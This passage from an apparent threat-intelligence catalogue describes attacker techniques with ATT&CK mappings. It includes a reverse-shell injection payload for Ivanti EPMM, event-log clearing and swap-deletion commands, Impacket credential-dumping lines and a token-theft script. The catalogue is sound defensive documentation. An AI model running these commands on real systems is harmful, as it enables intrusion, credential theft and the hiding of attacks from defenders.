  - **Runtime Hooks**: Tools like Frida are used to hook into app functions dynamically, 
  altering system properties (e.g., `ro.kernel.qemu`) to make the emulator appear 
  as a physical device.
  - **Customized Emulator Farms**: Organized groups deploy emulator farms with 
  dozens of emulators to cycle through spoofed devices rapidly, avoiding detection 
  and maximizing fraud efficiency.

## Common Attack Scenarios
- **Financial Fraud**: Emulator farms have been used to steal millions from banks 
by automating fraudulent transactions while evading detection systems.
- **API Abuse**: Attackers reverse-engineer apps running on emulators to exploit 
APIs for unauthorized access or data theft.
- **App Tampering**: Emulators facilitate code injection or reverse engineering 
to modify app functionality and compromise security features.

## Key Components Used in These Attacks
- Access to compromised credentials (usernames/passwords) and device identifiers.
- Custom scripts for network interception and API manipulation.
- Cycling of spoofed devices to evade detection and maintain operational stealth.
",1,2025-04-10,2025-04-14,,,,,"T1626, T1633, T1417, T1635, T1426, T0869, T1641"
a1e8f8b3-48ef-4559-a3a0-ecaed496d5f3,Unusual use of archiving tools,Threat Vectors,clear,"Threat actors often use legitimate archiving tools, like 7-Zip, WinRAR or tar, 
to compress and exfiltrate data from compromised systems. Attackers rename 
these executables or use the executables in ways that are atypical to evade 
security measures that would normally rely on standard file names 
or typical usage patterns.

Example : an attacker renaming 7z.exe to system32.exe and saving it in a
directory that is abnormal. They can then run the following command:
C:\Users\Public\system32.exe a -tzip C:\Users\Public\archive.zip C:\SensitiveData\*

This technique enables the attacker to archive sensitive data in a manner 
that would make the activity seem benign. The unusual locations of archive file 
creation and the usage of archiving tools with non-standard naming are 
the indicators of potentially malicious activity.

Also, a significant number of data compression and unusual outbound network traffic 
may indicate attempts to exfiltrate data.",1,2024-10-23,2024-10-24,,,,"[ICS] FIN7, FIN7, [Enterprise] TA505, TA505, [ICS] APT38, Lazarus Group, [Mobile] APT28, APT28, [Enterprise] Chimera","T1036, T1027, T1070"
bb2501d5-99c7-44a6-ac5a-9510102d6611,Azure - Principal Impersonation,Threat Vectors,clear,"This threat vector in Azure environments is a critical form of privilege escalation, 
where attackers abuse service principals or managed identities to elevate access 
within cloud resources. 

## Example Attack Scenario

A common scenario involves an attacker gaining access to a compromised Azure DevOps 
pipeline, often through stolen credentials or tokens. From there, the attacker exfiltrates 
Service Principal credentials (which act as privileged identities for applications), 
and leverages those credentials to authenticate to the Azure environment. With control 
over a service principal assigned privileged roles (such as Cloud Application Administrator 
or those with Application.ReadWrite.All permissions), the attacker can perform high-impact 
actions, such as adding new federated domains, registering malicious applications, 
or even forging authentication tokens to impersonate any user—potentially those 
with Global Administrator rights.

## Attack Goals and Impact

The primary goals of **Principal Impersonation** attacks include:
- Gaining **persistent, high-level access** to cloud resources and administrative controls.
- Bypassing access controls, enabling attackers to assume **any privileged or sensitive 
identity** within the Azure Active Directory tenant.
- **Exfiltration of data** from storage accounts or databases, creation of new virtual 
machines for malicious purposes, and the registration of attacker-controlled applications 
for ongoing access.
- Achieving **domain-wide impact** by forging authentication tokens or manipulating 
directory federation, ultimately resulting in complete tenant takeover or escalation 
to Global Administrator.

## Attack Flow and Methodology

The flow typically unfolds in these stages:

1. **Credential Theft/Manipulation**: Attacker exfiltrates, creates, or adds credentials 
(secret keys, certificates) to a service principal or managed identity.
2. **Impersonation**: Using the compromised identity, the attacker authenticates 
as the service principal and leverages assigned privileged roles or permissions 
to perform sensitive operations (e.g., managing federated domains, creating backdoor 
accounts, modifying authentication policies).
3. **Privilege Escalation**: Attacker forges tokens or utilizes elevated permissions 
to impersonate higher-privilege users or global administrators, potentially by exploiting 
federated SSO or Azure AD application registration features.
4. **Persistence and Impact**: Additional malicious applications are registered, 
new backdoor credentials are planted, and attacker actions may persist until discovered 
and remediated.
",2,2025-08-25,2025-09-04,,,"{'sequence::preceeds': ['2743bf18-3b86-4721-bf3e-153dcda0b149', 'fe6827f2-efb4-43b3-9ca3-b7d417111b32']}",APT29,"T1098.001, T1078.004, T1548"
0815bc77-169d-4320-aa32-770cf062509a,Azure - Unmanaged Scripting,Threat Vectors,clear,"Adversaries can use Azure function apps, automation accounts, or other scriptable 
cloud resources, to execute malicious code or operations.

## Example Attack Scenario

An attacker gains access to credentials or a compromised user account with permissions 
to create or modify Azure Function Applications. The attacker then uploads a malicious 
script (PowerShell, Python, etc.) into a Function App that is linked to production 
resources. Upon execution, this script can perform unauthorized actions—such as 
exfiltrating data, creating new users, or altering configurations—using the inherent 
privileges of the Function App. This does not require direct access to virtual machines 
or servers, but abuses the cloud-native scripting capabilities.

## Attack Goals and Impact

- **Privilege Escalation**: By abusing scripting environments, an attacker may use 
a compromised identity to escalate their access rights, gaining broader or administrative 
control over Azure resources.
- **Data Exfiltration**: Malicious scripts can be designed to access sensitive information 
like secrets, credentials, or customer data and move it off the platform.
- **Persistence and Lateral Movement**: Attackers can establish persistence by deploying 
scripts that create new accounts, tokens, or credentials, or by moving laterally 
to other services and resources in the cloud environment.
- **Service Disruption**: Unmanaged scripts may also be used to delete, modify, 
or take resources offline, impacting business continuity.

## Attack Flow and Methodology

1. **Deployment of Malicious Script**: The attacker uploads and executes a script 
in an unmanaged environment (such as Azure Functions, Automation Accounts, or pipelines) 
using operational permissions like ""Microsoft.Web/sites/functions/write"".
2. **Execution of Malicious Actions**: The script leverages privileged roles to 
perform sensitive operations (like reading secrets, writing corrupted configurations, 
or creating service identities).
3. **Evade Detection**: The attacker may implement techniques to hide their activities, 
such as using legitimate accounts, storing scripts in hard-to-monitor locations, 
or obfuscating code logic.
4. **Persistence, Lateral Movement, or Exfiltration**: The attacker continues their 
campaign, using the script to create new credentials, pivot to additional resources 
or exfiltrate sensitive data.
",1,2025-09-02,2025-09-04,,,"{'sequence::succeeds': ['140907eb-c9fb-4330-9d71-656422388b2b', 'b1593e0b-1b3b-462d-9ab6-21d1c136469d', '2743bf18-3b86-4721-bf3e-153dcda0b149'], 'sequence::preceeds': ['61ddc240-e5a6-4ca8-ae77-6b471b498913', '23f6a192-a25d-48b8-a235-7bb55e483682', 'b954303c-0ad0-4dc0-b5ca-492c3de9cd53']}",APT29,"T1059, T1078, T1204"
e5e4397f-eea4-423b-8b71-9b30d34a9d59,Disable Windows event logging through PowerShell,Threat Vectors,clear,"Threat actors can use PowerShell to disable Windows event logging.
They use this technique for example to disable diagnostic eventlogs
or some individual Windows log (for example: Application, Security
or System log).

Disabling of Application log can cause lost of the tracks for specific
application, for example: lack of visibility for authentication, time of
logon, failure events of the application or other related application
details.

Threat actors may disable Security Event log to prevent detection of
their logons on the system: number of logons, timestamp of the logon and 
with what privilege account and username they logon on the system. 

PowerShell command to clear event logs with 'Disable-EventLog' cmdlet:

Disable-EventLog -LogName ""Parameter""
where the ""Parameter"" can be Application, Security or System

Example how to clear individual logs with -ListLog parameter:

(Get-WinEvent -ListLog *).LogName | %{[System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($_)}

The threat actors can specify the logname and clear an individual log with:
[System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog(""Microsoft-Windows-FailoverClustering/Diagnostic"")

With the following section the Event log is disabled competely:

$wineventlog = get-winevent -ListLog ""Microsoft-Windows-FailoverClustering/Diagnostic"" -ComputerName hyperv-01
$wineventlog.IsEnabled = $false
$wineventlog.SaveChanges()

If the threat actors want to disable multiple event logs at once, they can
use a loop in their customly prepared PowerShell script to iterate through a
list of event log names and disable them one by one.

Example:

# Create a list of event log names to disable
$eventLogs = ""Application"", ""System"", ""Security""

# Iterate through the list of event logs and disable them one by one
foreach ($eventLog in $eventLogs) {
Disable-EventLog -LogName $eventLog
}

This script will disable the ""Application"", ""System"", and ""Security"" event logs on the local computer.
There is an option to modify the list of event logs to include any other specific event log that the
threat actor wants to disable.
",2,2022-01-06,2022-01-06,,,,"[Enterprise] APT29, UNC2452, [Mobile] Sandworm Team, GreyEnergy",T1562.002
ddab407e-d09d-4804-a4af-c11213553146,C2 domains point to non-routable IP addresses,Threat Vectors,clear,"The attackers may configure their own C2 domain to point to a non-internet
routable address, localhost (127.0.0.1) or RFC1918 (private) IP addresses [1]. 
By doing so, the underlying IP C2 infrastructure remains hidden, allowing
the threat actor to remain undetected for longer period of time until they
decide to engage infected hosts by changing the DNS A record to point the
actual C2 server.

One of the top threat actor groups is observed to use multiple malicious
domains which are resolving to non-routable addresses (like `127.0.0.1`).
During inactive periods of time, the goal of this technique is to mask the
location of the Command and Control server. Analysis indicates attacks
predominantly occur during night hours in China, originating likely from
North America, and are precisely timed to avoid detection ref [2], [3].     

Evasion of detection - when a threat actor uses this technique, they could 
evade detection by traditional network security monitoring tools and rules, 
which typically focus on outgoing (victim network -> internet) traffic.

Avoiding C2 Indicator of Compromise (IoC) detections - when the threat actor 
has a suspicion of being detected or the C2 IP has been exposed, they may 
change the C2 domain DNS record to a non-routable one while setting up new 
infrastructure.
",1,2025-08-27,2025-08-28,,,{'atomicity::implements': ['7b122bb4-fc13-438b-a052-4388c501ec59']},NightEagle,T1568
841e2a63-c95f-43f8-aef0-7ab96456445a,Automation accounts JWT extraction,Threat Vectors,clear,"The threat vector refers to attacks where attackers exploit Azure Automation Accounts 
to steal JSON Web Tokens (JWTs) associated with Managed Identities, enabling privilege 
escalation and lateral movement in cloud environments. Here's a detailed breakdown:

## Attack Methodology
**JWT Extraction via Runbook Modification**  
Attackers modify Automation Account runbooks to execute PowerShell scripts that 
access the Managed Identity endpoint:  
```powershell
$tokenAuthURI = $env:MSI_ENDPOINT + ""?resource=https://graph.microsoft.com/&api-version=2017-09-01""
$tokenResponse = Invive-RestMethod -Method Get -Headers @{""Secret""=""$env:MSI_SECRET""} -Uri $tokenAuthURI
$tokenResponse.access_token
```
This script retrieves a JWT for the Automation Account's Service Principal, which 
attackers then exfiltrate.

## Abuse Potential
- **Privilege Escalation**: Stolen JWTs grant the same permissions as the Automation 
Account's Managed Identity, enabling access to Azure Graph API, Key Vaults, and 
other services.
- **Token Replay**: Attackers use extracted JWTs to authenticate as the Service 
Principal outside Azure Automation's context.
- **Algorithm Confusion**: Weak JWT validation could allow attackers to modify token 
claims while maintaining valid signatures (e.g., switching from RS256 to HS256).

## Tooling
- **JWTXposer**: Scans archives for leaked JWTs and analyzes claims for privilege 
escalation opportunities.
- **jwt_tool**: Performs dictionary attacks against JWT secrets and exploits algorithm 
confusion vulnerabilities.
- **Azure APIs**: Native tools like Az PowerShell modules can abuse valid JWTs for 
resource enumeration.
",1,2025-06-18,2025-06-18,,,,,"T1134, T1528, T1550.001, T1190"
cfc6369a-e3df-4827-bb0d-969342f1558c,Credential manipulation on remote Windows endpoint,Threat Vectors,clear,"Threat actors can perform credential manipulation on a remote Windows
endpoint with a variety of tools like: Mimikatz, WMIExec, WinRM-based,
PsExec, SMBExec or PowerShell or others to extract credentials from
a credential storage point on the endpoint, as example from the endpoint's
memory. This can be done by an attacker who already has gained access to
and control of one endpoint.

Requirements:

- permissions to access the remote machine
- permission/ability to run credential dumping tools
- or an ability to start a service remotely

Impacket PsExec example with username and password:

python3 psexec.py <domain>/<user>:<pass>@<target_host>

or an option with NTLM hashes

python3 psexec.py -hashes <lmhash>:<ntlmhash> <domain>/<user>@<target_host>

Example for Impacket SMBExec with plaintext credentials and NTLM hashes:

python3 smbexec.py ""<domain>/<user>:<password>""@<target_host>

python3 smbexec.py -hashes <lmhash>:<ntlmhash> <domain>/<user>@<target_host>

Impacket suite contains a python script and can read the content of the
registry keys and decrypt the LSA Secrets passwords.

Example:

impacket-secretdump -sam /root/Desktop/sam.save -security /root/Desktop/security.save -system /root/Desktop/system.save LOCAL
",6,2023-01-27,2023-02-07,,,,"[Mobile] Sandworm Team, GreyEnergy, [Enterprise] MuddyWater, MuddyWater, [Enterprise] Mustang Panda, RedDelta","T1098.001, T1003"
46a79e6f-3df1-4332-a452-3f1fe83bdaf3,GodFather Banking Trojan,Threat Vectors,clear,"The GodFather malware is a highly advanced Android banking trojan that has evolved 
into one of the most effective and disruptive mobile threats targeting financial, 
banking, and cryptocurrency applications globally.

### Main Threat Vectors

- **On-Device Virtualization**: GodFather’s core tactic is deploying a virtualization 
framework on infected Android devices. It creates a virtual environment into which 
it loads real banking or crypto apps. When a legitimate app is launched, the user 
is redirected invisibly to the app’s clone running inside the sandbox, allowing 
the malware to monitor every action, tap, and credential input in real-time.
- **Overlay Attacks**: Beyond virtualization, GodFather can also display fake overlays 
that look identical to lock screens or login pages, capturing PINs, patterns, or 
passwords as users enter them, further compromising device and account security.
- **Hooking and Network Interception**: The malware uses the Xposed framework to 
hook into the OkHttp network library, which is utilized by many Android apps, thus 
logging network requests and credentials.

### Infection and Evasion

- **Infection Chain**: Typically distributed as trojanized or impersonated apps 
(e.g., fake music downloaders or bogus “Google Protect” apps), GodFather prompts 
users to grant invasive permissions for storage, SMS, contacts, and especially accessibility 
services.
- **Bypassing Security**: It employs advanced ZIP manipulation and code shifting 
to the Java layer to bypass static analysis tools. It also hooks Android APIs such 
as `getEnabledAccessibilityServiceList` to hide from anti-malware scans.
- **Command Capabilities**: Once active, it supports a broad command set for attackers, 
including remote control to simulate gestures, manipulate settings, execute overlay 
attacks, log keystrokes, and exfiltrate a wide range of sensitive data.

### Targets and Impact

- **Scope**: GodFather targets over 484 of the world’s most popular financial and 
cryptocurrency apps, with campaigns observed in Europe, the U.S., Canada, Asia, 
and the Middle East.
- **Consequences**: It can lead to severe financial loss, reputational damage, operational 
disruption, and regulatory fines for both consumers and organizations. The malware 
is particularly dangerous in BYOD enterprise environments, as it can compromise 
corporate data if personal devices are infected.
- **Stealth**: The virtualization attack results in “perfect deception,” as users 
interact with their real apps, making visual or user-driven detection virtually 
impossible.
",1,2025-09-17,2025-09-17,,,"{'sequence::succeeds': ['1a68b5eb-0112-424d-a21f-88dda0b6b8df', 'dd5d942c-bac4-4000-b9a6-ca4fef6cfb84'], 'support::synergize': ['4a4a7c81-ca98-4761-8f23-7ef6354e9d1c'], 'support::enabled': ['99c78650-8e19-4756-90fb-2573242577ca']}","DarkHotel, [Enterprise] Saint Bear","T1055, T1497, T1056.001"
06c60af1-5fa8-493c-bf9b-6b2e215819f1,Social engineering attack using Microsoft Teams,Threat Vectors,clear,"Adversaries are using compromised Microsoft 365 tenants to create technical
support-themed domains and send tech support lures via Microsoft Teams, 
attempting to trick users of the targeted organizations using social engineering.    

They aim to manipulate users into granting approval for multifactor authentication
(MFA) prompts, ultimately aiming to steal their credentials.    

#### Attack phases    

**Preparation phase**    

Attackers compromise an Azure tenant, rename it and add a new onmicrosoft[.]com
subdomain. It will use security-themed or product name-themed keywords to create
a new subdomain, such as teamsprotection.onmicrosoft[.]com 
Add a new user associated with that domain from which the attacker will send the
outbound message to the target tenant.    

**Social engineering phase**    

Attackers send a Teams chat message to the target from the compromised external user
masquerading as a technical support or security team; if the targeted user accepts
the message request, attackers send a Microsoft Teams message to convince the target
to enter a code into the Microsoft Authenticator app on his/her mobile device.
If the targeted user enters the code into the Authenticator app, the attacker is
granted a token to authenticate as the targeted user.    

**Post-compromise phase**    

Involves information theft from the compromised Microsoft 365 tenant, and in some 
cases, adding a device to the organisation as a managed device through Microsoft
Entra ID (formerly Azure Active Directory), likely an attempt to circumvent conditional
access policies configured to restrict access to specific resources to managed devices only.    

#### Additional Tactics: Microsoft Teams Vishing    

### Microsoft Teams Vishing    

- Attackers initiate contact via Microsoft Teams within 15-30 minutes of the email bombing.
- They pose as IT support personnel or ""Help Desk Managers"".
- Adversary-controlled Office 365 accounts are used, often with display names mimicking 
legitimate IT staff.
- Profile pictures and backgrounds are crafted to appear authentic.
- Attackers exploit the victim's state of confusion and urgency caused by the email bombing.    
",4,2023-08-07,2025-10-01,,,,"[Enterprise] APT29, UNC2452",T1199
37f24c48-4a38-4682-aa76-5845ed2d6890,Azure - Policy with DeployIfNotExists definition,Threat Vectors,clear,"The following threat vector, let attackers maintain long-term access or
facilitate further exploitation. 

### Example Attack Scenario

An attacker with sufficient permissions in an Azure tenant creates or modifies 
an Azure Policy using the `DeployIfNotExists` policy definition. This policy is
engineered to deploy a malicious resource (e.g., a virtual machine extension,
a role assignment, or a script backdoor) whenever certain conditions are met, 
such as new VMs being provisioned. The attacker also triggers remediation so
the malicious payload is retroactively deployed to existing resources in scope.  

For example, the attacker could use Azure Policy to automatically grant their
account or service principal administrative permissions on every new or existing
VM, or silently disable logging and monitoring across sensitive assets to evade
detection.

### Attack Goals and Impact

The objective is to enable persistent access or privilege escalation by leveraging 
Azure's orchestration and policy automation features. Typical goals include:
- Establishing backdoors in affected resources (VMs, service principals, databases) 
for repeated covert access.
- Modifying logging, auditing, or security configurations to avoid detection (for 
instance, disabling Azure Activity Logs for specific assets).
- Automatically re-applying attacker-controlled changes whenever the legitimate 
administrator attempts remediation or, through continuous policy enforcement, on 
every new resource.
- Assigning additional permissions, modifying access control lists, or deploying 
malware through policy-triggered tasks.
The impact is broad, enabling attackers to maintain long-term access with minimal 
operational footprint, bypass typical monitoring controls, manipulate resources 
at scale, and orchestrate further attack stages (such as lateral movement or
privilege escalation).

### Attack Flow and Methodology

The typical attacker workflow follows these steps:

- **Policy Creation/Modification**: A new policy is created, or an existing one 
is modified, with a ""DeployIfNotExists"" or similarly reactive definition. The definition 
specifies a payload—such as deploying a VM extension, custom script, role assignment, 
or other resource manipulation—that achieves the persistence goal.
- **Scope Assignment**: The attacker assigns the malicious policy to targeted scopes 
(resource groups, subscriptions, or management groups) to maximize coverage and effect.
- **Remediation Triggering**: Remediation is kicked off so policy enforcement is 
applied to existing resources—retrospectively deploying the backdoor.
- **Continuous Enforcement**: As policy is automatically enforced, every future 
resource creation or update within scope will bear the attacker's payload—ensuring 
persistence and stealth.
- **Evading Detection**: The attacker may also configure policies to weaken monitoring, 
disable security logging, or only target specific assets to avoid suspicion and discovery.
",1,2025-09-29,2025-09-29,,,"{'sequence::preceeds': ['2743bf18-3b86-4721-bf3e-153dcda0b149', '61ddc240-e5a6-4ca8-ae77-6b471b498913', '23f6a192-a25d-48b8-a235-7bb55e483682', 'b954303c-0ad0-4dc0-b5ca-492c3de9cd53'], 'support::enabled': ['fe6827f2-efb4-43b3-9ca3-b7d417111b32', 'b1593e0b-1b3b-462d-9ab6-21d1c136469d', '53063205-4404-4e6d-a2f5-d566c6085d96']}",,"T1098, T1078.004, T1578"
b2ce7db4-253f-4286-9b38-a1a7b60af49e,Authentication bypass vulnerability in Ivanti EPMM,Threat Vectors,clear,"Ivanti EPMM - formerly known as MobileIron - is a Mobile Device
Management solution (MDM) used to centrally manage corporate and
private mobile phones across an organisation ref [1].  

A threat actor exploit a zero-day vulnerability in Ivanti EPMM
system. In one of the threat actor campaigns was observed that
the threat actor used even a second zero-day exploit chained to
the fist one.  

The vulnerabilities could allow an attacker to bypass
authentication mechanisms and gain unauthorised access
to the system. 

The first used vulnerability is related to the handling of
authentication tokens. An attacker can exploit this vulnerability
by sending a crafted request to the `/api/v1/auth` endpoint.
This flaw can be exploited without any prior authentication or
authorisation ref [3].  

### Vulnerabilities in Ivanti EPMM exploitation

- CVE-2025-4427: A vulnerability in the `/api/v1/auth` endpoint,
which allows an attacker to bypass authentication by sending
a crafted request with a malicious expression payload ref [3].
- CVE-2025-4428: A vulnerability in the `/api/v1/users` endpoint,
which allows an attacker to bypass authentication and gain access
to sensitive user information by sending a crafted request with
a malicious expression payload ref [3].

Based on the provided information from the reports and analysis
there are several steps how a threat actor might exploit an
authentication bypass vulnerability in Ivanti EPMM:

1. Identify the vulnerable endpoint - the threat actor identifies
a vulnerable endpoint, such as `/api/v1/auth` or `/api/v1/users`,
which is susceptible to authentication bypass attacks.
2. Craft a malicious request - a threat actor crafts a malicious
request with a specially designed payload, which can be an expression
payload or a crafted authentication token.

A request such as :

  ```powershell
  /mifs/rs/api/v2/featureusage?format=${''
  .getClass().forName('java.lang.Runtime')
  .getMethod('getRuntime').invoke(null)
  .exec('sh -i >& /dev/tcp/C2.IP.Add.ress/8080 0>&1').waitFor()}
  ```
reaches the vulnerable validator before authentication, spawning a
reverse shell.
3. Send the malicious request - threat actor sends the malicious
request to the vulnerable endpoint, which can bypass the authentication
mechanism and grant access to the system.
4. Gain unauthorised access - in the end as a final step a threat
actor gains unauthorised access to the system, which can lead to
further malicious activities, such as data breaches, lateral
movement, or system compromise ref [4].  
",1,2025-06-27,2025-06-27,,,,,"T1190, T1068"
ef4ba2bf-dfcb-4b70-8f45-7625baeb96d0,Mobile malware attacks targeting iOS,Threat Vectors,clear,"iOS devices are protected by a robust, layered security architecture,
yet attackers continue to develop sophisticated malware that targets 
Apple devices. These threats exploit OS' vulnerabilities, abuse of
legitimate features, and use of social engineering to gain unauthorized 
access, steal sensitive data, or remotely control devices.

### How malware interacts with the architecture

Despite these protections, attackers exploit weaknesses at different
layers of the iOS architecture:

- **Jailbreaking:** By exploiting kernel or system vulnerabilities, attackers
can break out of the sandbox and disable code signing, allowing arbitrary code
execution and installation of malicious apps. This undermines the foundational
security of the Core OS layer.

- **Enterprise Provisioning/MDM Abuse:** Attackers use enterprise certificates
or MDM profiles to bypass App Store restrictions and install malicious apps,
circumventing code signing checks at the app distribution level.

- **App Replacement (Masque Attack):** Exploits flaws in the app installation
process, allowing a malicious app to replace a legitimate one if it shares the
same bundle identifier, gaining access to sensitive app data.

- **Vulnerability Exploitation:** Attackers target flaws in system frameworks or 
the kernel to escalate privileges, bypass sandboxing, or execute unauthorized code.

- **Reverse Engineering and Code Injection:** Attackers decompile apps to discover 
sensitive logic or keys, inject malicious code, or bypass security controls. Lack 
of obfuscation and anti-tamper mechanisms make these attacks easier.

- **Dynamic Instrumentation:** Tools like Frida or Ghidra allow real-time
manipulation of app processes, bypassing authentication or extracting sensitive data.

- **Man-in-the-Middle (MitM) Attacks:** Target insecure network communications, 
intercepting data between the app and backend servers.

### Abuse of iOS architecture

The basic architecture for iOS is divided into four **layers**:
 - Core services, Core OS: manage basic services in iOS  
 - Cocoa Touch, Media: handle the user interface and advanced graphics.

Below the layers there are the iOS **frameworks**, which are similar to static and
dynamic shared libraries, they provide a library of routines that an application can
access to do a specific task:
 - Security  
 - UIKit  
 - Foundation  
 - AVFoundation  
 - System Configuration  
 - MessageUI

After the frameworks there are the functions, which are being abused by different malware.

### Attack Vectors

- **Exploitation of Vulnerabilities:** Attackers leverage flaws in iOS, such as 
remote code execution or privilege escalation, to run malicious code on devices 
without user interaction.

- **Malicious Messaging:** Some attacks use iMessage or other messaging platforms 
to deliver exploit-laden attachments, triggering vulnerabilities and enabling further 
compromise.

- **Abuse of Enterprise Provisioning:** Attackers misuse Apple’s Developer Enterprise 
Program to distribute malicious apps outside the App Store, bypassing Apple’s app 
review process.

- **Masque Attack:** Replaces a legitimate app with a malicious one sharing the 
same bundle identifier, allowing credential theft or background surveillance.

- **Social Engineering and Phishing:** Users are lured into installing malicious 
profiles or apps via deceptive messages, websites, or emails.

### Types of iOS Malware (excluding Spyware) and Functions

| Malware Type                  | Functionality                                                                                 | Example(s)                        |
|-------------------------------|---------------------------------------------------------------------------------------------|------------------------------------|
| **Remote Access Trojan (RAT)**| Grants attackers remote control over the device, can install apps, manipulate settings, etc. | GoldPickaxe                        |
| **Adware**                    | Displays intrusive ads, redirects traffic, generates ad revenue for attackers                | Lock Saver Free, Muda (AdLord), YiSpecter |
| **Ransomware/Scareware**      | Locks device/browser or displays fake warnings, demands payment to restore access            | Safari JavaScript Pop-up Scareware |
| **Credential Stealers**       | Steals Apple ID, passwords, or banking credentials                                          | KeyRaider, XcodeGhost              |
| **App Replacement/Impersonation** | Replaces legitimate apps with malicious ones to steal data or perform fraudulent actions    | Masque Attack, YiSpecter           |

### Impact and Risks

- **Data Theft:** Attackers can steal personal information, financial data, and 
sensitive communications.

- **Device Takeover:** Some malware enables full remote control of the device, allowing 
attackers to impersonate the user or perform fraudulent transactions.

- **Corporate Espionage:** In enterprise environments, a compromised iOS device 
can serve as an entry point into corporate networks, leading to broader breaches 
and operational disruptions.

- **Extortion:** Attackers may use scareware or ransomware to extort victims for 
payment in exchange for restoring access or not disclosing stolen data.

- **Disruption:** Adware and scareware can degrade device performance, flood users 
with ads, or lock browsers, impacting usability.
",1,2025-04-28,2025-05-12,,,"{'sequence::preceeds': ['1a68b5eb-0112-424d-a21f-88dda0b6b8df', 'dd5d942c-bac4-4000-b9a6-ca4fef6cfb84', '99c78650-8e19-4756-90fb-2573242577ca']}",,"T1404, T1638, T1212, T1663, T1655, T1456, T1417"
497ccceb-c012-4830-aa61-4a046e7b6ce9,Disable swapping paging devices,Threat Vectors,clear,"Disable Swapping/Paging Devices is a tactic adversaries may employ to impair defenses, 
hamper forensic analyses, or disrupt normal system operations. 
By turning off, deleting, or misconfiguring the system’s paging file or swap space, 
malicious actors can limit the ability of the operating system to manage memory efficiently.  

## Evade Detection : Certain security tools or analysis processes rely on paging 
and memory snapshots. Disabling the swap or page file can complicate memory captures, 
obstructing forensic investigators from retrieving certain artifacts.  

## Cause Operational Instability : Without a functioning page file, systems may slow down 
or crash once physical RAM is fully consumed. This can be used intentionally to disrupt 
business operations or create an opening for other malicious activities 
while defenders are distracted.  

## Hide Malicious Components : Some malware frameworks attempt to evade detection 
by maintaining all malicious code in volatile memory. If system memory is not paged to disk, 
there is a slimmer trail of evidence left in permanent storage (e.g., pagefile.sys in Windows).  

### Windows 
```powershell
wmic computersystem where name=""%computername%"" set AutomaticManagedPagefile=False
wmic pagefileset where name=""C:\\pagefile.sys"" delete
```
This sequence disables the automatic page file management 
and removes the page file on the C: drive.

### Linux
```bash
swapoff -a
sed -i '/swap/d' /etc/fstab
```
This one disable all swap spaces and remove swap references from `/etc/fstab`, 
ensuring the change persists on reboot.
",1,2025-01-03,2025-01-03,,,,"[Mobile] APT28, APT28, [ICS] APT38, Lazarus Group",T1562.001
53ca52ed-a7e7-4094-95ec-b4ef522dc689,VBS script creates a scheduled task,Threat Vectors,clear,"Threat actors often use Visual Basic Scripting (VBS) to create scheduled
tasks on compromised Windows systems. VBS is a built-in scripting language
on Windows systems, making it an attractive choice for threat actors. It
allows the threat actors to execute code without relying on external tools
or binaries, reducing the risk of detection.    

Once executed by the victim, the VBScript establishes persistence on
infected machines by creating scheduled tasks and modifying the Windows
Registry.

### Creating a scheduled task using a VBS script

To create a scheduled task using VBS, threat actors typically follow the
steps provided below:
1. An initial VBS script creation - the attacker creates a VBS script that
contains the malicious code. This script can be embedded in an email
attachment, downloaded from a compromised website, or created locally on
the compromised system.  
2. The created VBS script uses `schtasks` - the VBS script uses the
`schtasks` to create a new scheduled task. The `SchTasks` command is a
built-in Windows utility that allows users to create, delete, and manage
scheduled tasks.
3. Task details: The VBS script specifies the task details, including the
task name, description, and the command or script to be executed.
4. Set a task trigger - the VBS script may set a task trigger, which defines
when the task should be executed. This can be a specific time, daily,
weekly, or on system startup.
5. A task preservation - the VBS scrip

### Some of the techniques used to achieve VBS persistence and
obfuscation

- Obfuscation: Threat actors often obfuscate their VBS scripts to evade
detection by security software. They use techniques like random variable
names, fake function calls or garbage code to hide the function of the
malicious code.  

- Scheduled task chaining: Threat actors create as tasks under the current
user or if allowed under SYSTEM to elevate privileges and maintain foothold
onto the system.  

### An example for a VBS script which creates a scheduled task

Below is given an example of a VBS (Visual Basic Scripting) script that
creates a scheduled task to run a command or application at a specified
time. This script uses the Windows Task Scheduler to schedule the task.  

```visualbasic

' Create a new task
Dim sch, task
Set sch = CreateObject(""Schedule.Service"")
sch.Connect()

' Define the task
Dim taskDefinition
Set taskDefinition = sch.CreateNewTask(0)

' Set task registration info
taskDefinition.RegistrationInfo.Description = ""This is a test task created by VBS script""
taskDefinition.RegistrationInfo.Author = ""Your Name""

' Set task principal (who runs the task)
Dim principal
Set principal = taskDefinition.Principal
principal.LogonType = 3 ' Interactive or 3 for S4U
principal.UserId = ""NT AUTHORITY\SYSTEM"" ' You can change this to a different user

' Set task trigger (when to run the task)
Dim trigger
Set trigger = taskDefinition.Triggers.Create(_
TaskTriggerType2.Daily)
trigger.StartTime = ""08:00:00"" ' 8 AM daily
trigger.Id = ""DailyTrigger""

' Set task action (what to run)
Dim action
Set action = taskDefinition.Actions.Create(_
TaskActionType.Exec)
action.Path = ""C:\Windows\System32\notepad.exe"" ' Path to the application to run
action.Arguments = """" ' Arguments if any

' Register the task
Dim taskFolder
Set taskFolder = sch.GetFolder(""\"")
taskFolder.RegisterTaskDefinition ""TestVBS Task"", taskDefinition, 6, , , 3, , , task

```
",1,2025-06-25,2025-07-08,,,"{'sequence::succeeds': ['dd5d942c-bac4-4000-b9a6-ca4fef6cfb84', 'c7ed4fad-a58f-47da-9938-4a673526b3f4']}","[ICS] FIN7, FIN7, [ICS] Lazarus Group, Lazarus Group, [Enterprise] APT29, APT29","T1569.002, T1053, T1082, T1005, T1112, T1053.005"
fe243f7f-ffc5-49c0-94e6-293ae2411ad6,Windows User and Group Enumeration with specific tools,Threat Vectors,clear,"Adversaries may attempt to enumerate the environment and list all local system 
and domain accounts or groups.To achieve this purpose, they can use variety of 
tools and techniques. Their goal is reconnaissance, gathering of user's account 
information on the system or in the domain and further usage of accounts with higher 
privilege access.

There are several tools that can be used by adversaries, such as the following:
  
- Kali Tool like enum4linux 
- Bloodhound can also 
- smbmap, smbclient, etc..
- nmap
- Use of any developped tools or scripts like this one: - windapsearch

Some cases in which adversaries have used such tools include the following:

## Wizard Spider using Bloodhound after Ryuk ransomware compromise:

Ryuk actors quickly map the network to understand the infection scope. They use native 
tools like net view, net computers, and ping to locate network shares and domain controllers. 
For lateral movement, they rely on PowerShell, WMI, Remote Management, RDP, and third-party 
tool Bloodhound.
